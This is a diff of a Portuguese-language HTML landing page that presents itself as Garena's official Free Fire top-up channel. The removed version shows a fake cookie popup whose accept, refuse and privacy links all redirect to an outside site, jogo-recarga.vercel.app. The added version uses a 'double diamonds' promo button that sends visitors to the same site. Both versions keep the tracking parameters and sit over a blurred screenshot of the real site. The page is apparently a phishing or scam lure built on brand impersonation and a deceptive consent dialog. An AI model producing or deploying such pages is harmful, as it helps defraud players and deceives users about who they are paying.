@@ -1,403 +1,172 @@
 <!DOCTYPE html>
-<!-- saved from url=(0034)https://recargasjogox.netlify.app/ -->
-<html lang="pt-BR"><style id="videoRecorder-egmenneb">
-            ._ext_highlight {
-                outline: 3px solid rgba(255, 0, 0, 0.5);
-                outline-offset: -3px;
-                transition: all 0.1s ease;
-                z-index: 2147483647;
-            }
-            ._ext__floating_popup {
-                position: fixed;
-                top: 80px;
-                right: 30px;
-            
-                background-color: #333;
-                color: #fff;
-                text-align: center;
-                border-radius: 2px;
-                margin: auto;
-                height: 30px;
-                white-space: nowrap;
-                padding: 8px;
-                z-index: 2147483647;
-            }
-            
-            ._ext__floating_popup > button {
-                margin-left: 5px;
-                color: black;
-                background-color: white;
-                border: 2px solid #e7e7e7;
-                cursor: pointer;
-            }
-        </style><style id="countdown-egmenneb">
-        .countdown-egmenneb-button {
-            background: 0 0;
-            border: none;
-            box-sizing: border-box;
-            color: #ffffff;
-            cursor: pointer;
-            display: block;
-            font-family: 'Open-Sans';
-            font-size: 12px;
-            height: auto;
-            line-height: 1;
-            margin: 0 auto;
-            padding: 0 12px;
-        }
-        .countdown-egmenneb-button:focus {
-            background: 0 0;
-        }
-        .countdown-egmenneb-button:hover {
-            background: 0 0;
-        }
-        .countdown-egmenneb {
-            background: rgba(59, 59, 59, 0.8);
-            border-radius: 4px;
-            color: #ffffff;
-            left: 50%;
-            padding: 14px 14px 10px;
-            position: fixed;
-            top: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 110000;
-        }
-        .countdown-egmenneb.capture-delayed {
-            left: 50px;
-            top: 50px;
-            transform: translate(0, 0);
-        }
-        .countdown-egmenneb-content {
-            height: 120px;
-            position: relative;
-            width: 120px;
-        }
-        .countdown-egmenneb-progress {
-            height: 100%;
-            left: 0;
-            position: absolute;
-            top: 0;
-            width: 100%;
-        }
-        .countdown-egmenneb-progress svg {
-            display: block;
-            height: 100%;
-            width: 100%;
-        }
-        .countdown-egmenneb-sep {
-            background: #758386;
-            height: 1px;
-            margin: 7px 0;
-        }
-        .countdown-egmenneb-cancel .nsc-button {
-            color: #ffffff;
-            display: block;
-            font-size: 14px;
-            padding: 0 3px;
-            text-align: center;
-            width: 100%;
-        }
-        </style><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canal Oficial de Recarga - Garena</title>
-    <meta name="description" content="Canal Oficial de Recarga Garena Free Fire">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Canal Oficial de Recarga - Garena</title>
+  <meta name="description" content="Canal Oficial de Recarga Garena Free Fire" />
+  <meta property="og:title" content="Canal Oficial de Recarga - Garena" />
+  <meta property="og:description" content="Canal Oficial de Recarga Garena Free Fire" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    html, body { height: 100%; }
 
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-        }
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      background: #1a1a1a;
+      overflow: hidden;
+    }
 
-        /* ===== BACKGROUND ===== */
-        .bg-container {
-            position: fixed;
-            inset: 0;
-            z-index: 1;
-            background: #1a1a1a url('bg.png') top center / cover no-repeat;
-            filter: blur(10px) brightness(0.7);
-        }
+    /* ===== Fundo: screenshot do site ===== */
+    .bg {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      background-color: #1a1a1a;
+      background-image: url("bg.png");
+      background-size: cover;
+      background-position: top;
+      background-repeat: no-repeat;
+      filter: blur(10px) brightness(0.7);
+    }
 
-        /* ===== DARK OVERLAY ===== */
-        .overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.55);
-            z-index: 2;
-        }
+    /* ===== Overlay escuro ===== */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 2;
+      background: rgba(0, 0, 0, 0.55);
+    }
 
-        /* ===== POPUP CONTAINER ===== */
-        .popup-wrapper {
-            position: fixed;
-            inset: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-            padding: 20px;
-        }
+    /* ===== Popup da Promoção ===== */
+    .popup-wrap {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
 
-        .popup {
-            background: #ffffff;
-            border-radius: 16px;
-            width: 100%;
-            max-width: 460px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
-            overflow: hidden;
-            animation: popupIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
+    .popup {
+      width: 100%;
+      max-width: 400px;
+      overflow: hidden;
+      border-radius: 16px;
+      border: 1px solid rgba(59, 130, 246, 0.4);
+      background: #0b1220;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(59, 130, 246, 0.25);
+      animation: popupIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
 
-        @keyframes popupIn {
-            0% {
-                opacity: 0;
-                transform: scale(0.9) translateY(20px);
-            }
+    @keyframes popupIn {
+      from { opacity: 0; transform: scale(0.85) translateY(20px); }
+      to { opacity: 1; transform: scale(1) translateY(0); }
+    }
 
-            100% {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
+    .popup img {
+      display: block;
+      width: 100%;
+    }
 
-        /* ===== RAINBOW TOP BAR ===== */
-        .popup-rainbow {
-            height: 5px;
-            background: linear-gradient(90deg,
-                    #4285F4 0%,
-                    #4285F4 25%,
-                    #EA4335 25%,
-                    #EA4335 50%,
-                    #FBBC05 50%,
-                    #FBBC05 75%,
-                    #34A853 75%,
-                    #34A853 100%);
-        }
+    .popup-content { padding: 20px 24px 24px; }
 
-        /* ===== POPUP CONTENT ===== */
-        .popup-body {
-            padding: 28px 32px 24px;
-        }
+    .btn-recarregar {
+      display: flex;
+      width: 100%;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 16px 24px;
+      border-radius: 12px;
+      background: linear-gradient(to bottom, #ff9c1a, #f57c00);
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+      text-decoration: none;
+      box-shadow: 0 6px 18px rgba(245, 124, 0, 0.45);
+      transition: all 0.2s ease;
+      cursor: pointer;
+      border: none;
+    }
 
-        .popup-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 18px;
-        }
+    .btn-recarregar:hover {
+      background: linear-gradient(to bottom, #ffab3d, #ff8f00);
+      box-shadow: 0 8px 24px rgba(245, 124, 0, 0.6);
+    }
 
-        .popup-icon {
-            width: 36px;
-            height: 36px;
-            flex-shrink: 0;
-        }
+    .btn-recarregar:active { transform: translateY(1px); }
 
-        .popup-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            line-height: 1.3;
-        }
+    .btn-recarregar svg { width: 20px; height: 20px; flex-shrink: 0; }
 
-        .popup-text {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.65;
-            margin-bottom: 24px;
-        }
+    .popup-content p {
+      margin-top: 12px;
+      text-align: center;
+      font-size: 11.5px;
+      line-height: 1.5;
+      color: #8fa3c0;
+    }
 
-        .popup-text strong {
-            color: #333;
-        }
-
-        /* ===== BUTTONS ===== */
-        .popup-buttons {
-            display: flex;
-            gap: 12px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 13px 24px;
-            border-radius: 8px;
-            font-family: inherit;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .btn-outline {
-            background: #fff;
-            border: 1.5px solid #dadce0;
-            color: #5f6368;
-        }
-
-        .btn-outline:hover {
-            background: #f8f9fa;
-            border-color: #c4c7cc;
-        }
-
-        .btn-primary {
-            background: #1a73e8;
-            border: 1.5px solid #1a73e8;
-            color: #fff;
-        }
-
-        .btn-primary:hover {
-            background: #1765cc;
-            border-color: #1765cc;
-            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.35);
-        }
-
-        /* ===== FOOTER NOTE ===== */
-        .popup-footer {
-            text-align: center;
-            padding: 0 32px 20px;
-        }
-
-        .popup-footer p {
-            font-size: 11.5px;
-            color: #9aa0a6;
-            line-height: 1.5;
-        }
-
-        .popup-footer a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .popup-footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-
-            /* Background: more blur on mobile */
-            .bg-container {
-                filter: blur(8px) brightness(0.7);
-            }
-
-            /* Lighter overlay so background shows through */
-            .overlay {
-                background: rgba(0, 0, 0, 0.45);
-            }
-
-            .popup {
-                max-width: 92%;
-            }
-
-            .popup-body {
-                padding: 22px 20px 18px;
-            }
-
-            .popup-title {
-                font-size: 16px;
-            }
-
-            .popup-text {
-                font-size: 13px;
-                margin-bottom: 20px;
-            }
-
-            .btn {
-                padding: 12px 16px;
-                font-size: 14px;
-            }
-
-            .popup-footer {
-                padding: 0 20px 20px;
-            }
-        }
-    </style>
-
-    <script src="./Canal Oficial de Recarga - Garena_files/latest.js.descarregar" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    @media (max-width: 480px) {
+      .popup-content { padding: 20px 20px; }
+      .btn-recarregar { padding: 14px 24px; font-size: 15px; }
+    }
+  </style>
 </head>
-
 <body>
+  <!-- Fundo: screenshot do site -->
+  <div class="bg"></div>
 
-    <!-- Background: screenshot do site -->
-    <div class="bg-container"></div>
+  <!-- Overlay escuro -->
+  <div class="overlay"></div>
 
-    <!-- Overlay escuro -->
-    <div class="overlay"></div>
+  <!-- Popup da Promoção -->
+  <div class="popup-wrap">
+    <div class="popup">
+      <!-- Banner da promoção -->
+      <img
+        src="bonus_ff.png"
+        alt="Promoção: Recarregue pelo ID e ganhe 2x de diamantes nas recargas a partir de 2.180 diamantes"
+      />
 
-    <!-- Popup de Cookies -->
-    <div class="popup-wrapper">
-        <div class="popup">
-            <div class="popup-rainbow"></div>
+      <div class="popup-content">
+        <!-- ====== CONFIGURE SUA URL DE DESTINO AQUI (no script abaixo) ====== -->
+        <a href="#" class="btn-recarregar" onclick="redirecionar(event); return false;">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M13 2L4.5 13.5H11L9.5 22L19.5 9.5H12.5L13 2Z" fill="currentColor" />
+          </svg>
+          Recarregar agora
+        </a>
 
-            <div class="popup-body">
-                <div class="popup-header">
-                    <!-- Cookie Icon SVG -->
-                    <svg class="popup-icon" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <circle cx="18" cy="18" r="17" fill="#FFF3E0"></circle>
-                        <circle cx="18" cy="18" r="17" stroke="#FF9800" stroke-width="1.5"></circle>
-                        <circle cx="12" cy="14" r="2.5" fill="#795548"></circle>
-                        <circle cx="22" cy="12" r="2" fill="#795548"></circle>
-                        <circle cx="16" cy="22" r="2.5" fill="#795548"></circle>
-                        <circle cx="24" cy="21" r="1.8" fill="#795548"></circle>
-                        <circle cx="10" cy="22" r="1.5" fill="#795548"></circle>
-                        <circle cx="20" cy="17" r="1.5" fill="#A1887F"></circle>
-                    </svg>
-                    <h2 class="popup-title">Preferências de Cookies</h2>
-                </div>
-
-                <p class="popup-text">
-                    Usamos cookies para melhorar sua experiência.
-                    Você pode <strong>aceitar</strong> ou <strong>recusar</strong> o uso de cookies não essenciais.
-                </p>
-
-                <div class="popup-buttons">
-                    <a href="https://recargasjogox.netlify.app/#" class="btn btn-outline" id="btn-recusar">Recusar</a>
-                    <a href="https://recargasjogox.netlify.app/#" class="btn btn-primary" id="btn-aceitar">Aceitar</a>
-                </div>
-            </div>
-
-            <div class="popup-footer">
-                <p>Saiba mais na nossa <a href="https://recargasjogox.netlify.app/#" id="link-privacidade">Política de Privacidade</a>.</p>
-            </div>
-        </div>
+        <p>Recarga oficial pelo ID — ganhe o dobro de diamantes</p>
+      </div>
     </div>
+  </div>
 
-    <script>
-        // ====== CONFIGURE SUA URL DE DESTINO AQUI ======
-        const URL_DESTINO = 'https://jogo-recarga.vercel.app/';
-        // ================================================
+  <script>
+    // ====== CONFIGURE SUA URL DE DESTINO AQUI ======
+    var URL_DESTINO = "https://jogo-recarga.vercel.app/";
+    // ================================================
 
-        function getUrlDestinoComUtms() {
-            const paramsAtuais = window.location.search;
-            if (paramsAtuais) {
-                // Se a URL de destino já tem parâmetros, concatena com &
-                const separador = URL_DESTINO.includes('?') ? '&' : '?';
-                return URL_DESTINO + separador + paramsAtuais.substring(1);
-            }
-            return URL_DESTINO;
-        }
+    function getUrlDestinoComUtms() {
+      var paramsAtuais = window.location.search;
+      if (paramsAtuais) {
+        var separador = URL_DESTINO.indexOf("?") !== -1 ? "&" : "?";
+        return URL_DESTINO + separador + paramsAtuais.substring(1);
+      }
+      return URL_DESTINO;
+    }
 
-        function redirecionar(e) {
-            e.preventDefault();
-            window.location.replace(getUrlDestinoComUtms());
-        }
-
-        document.getElementById('btn-aceitar').addEventListener('click', redirecionar);
-        document.getElementById('btn-recusar').addEventListener('click', redirecionar);
-        document.getElementById('link-privacidade').addEventListener('click', redirecionar);
-    </script>
-
-
-
-<div class="region-selector-container" style="position: fixed; top: 0px; left: 0px; width: 100vw; height: 100vh; z-index: 2147483645; display: none;"><template shadowrootmode="open"><div class="region-selector-overlay" style="position: fixed; top: 0px; left: 0px; width: 100vw; height: 100vh; background: transparent; z-index: 2147483646; display: none; cursor: default; user-select: none; pointer-events: auto;"></div><div class="region-selector-box" style="position: fixed; padding: 4px; top: 25%; left: 25%; width: 50%; height: 50%; border: 2px dashed rgb(255, 255, 255); background: transparent; z-index: 2147483647; display: none; box-shadow: rgba(0, 0, 0, 0.5) 0px 0px 0px 100vmax; cursor: move;"><div style="width: 100%; height: 100%; background: transparent; pointer-events: none; cursor: none;"></div><div class="handle top-left" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; top: -6px; left: -6px; cursor: nw-resize;"></div><div class="handle top" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; top: -6px; left: 50%; margin-left: -6px; cursor: n-resize;"></div><div class="handle top-right" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; top: -6px; right: -6px; cursor: ne-resize;"></div><div class="handle right" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; top: 50%; right: -6px; margin-top: -6px; cursor: e-resize;"></div><div class="handle bottom-right" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; bottom: -6px; right: -6px; cursor: se-resize;"></div><div class="handle bottom" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; bottom: -6px; left: 50%; margin-left: -6px; cursor: s-resize;"></div><div class="handle bottom-left" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; bottom: -6px; left: -6px; cursor: sw-resize;"></div><div class="handle left" style="position: absolute; width: 8px; height: 8px; background: white; border: 1px solid rgb(51, 51, 51); border-radius: 50%; top: 50%; left: -6px; margin-top: -6px; cursor: w-resize;"></div><div style="position: absolute; top: -25px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.7); color: white; padding: 2px 6px; border-radius: 3px; font-size: 12px; white-space: nowrap;"></div><div style="position: absolute; left: 50%; transform: translateX(-50%); display: flex; gap: 10px; bottom: -45px;"><button style="padding: 8px 16px; background: rgb(76, 175, 80); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 4px; cursor: pointer; font-size: 14px;">Iniciar gravação</button><button style="padding: 8px 16px; background: rgb(244, 67, 54); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 4px; cursor: pointer; font-size: 14px;">Cancelar registro</button></div></div></template></div></body><iframe id="dl-egmenneb" src="./Canal Oficial de Recarga - Garena_files/downloading.html" style="display: none;"></iframe><iframe id="dl-rec-egmenneb" src="./Canal Oficial de Recarga - Garena_files/recording.html" allow="camera *; microphone *; display-capture *" style="display: none;"></iframe></html>
+    function redirecionar(e) {
+      if (e) e.preventDefault();
+      window.location.replace(getUrlDestinoComUtms());
+    }
+  </script>
+</body>
+</html>
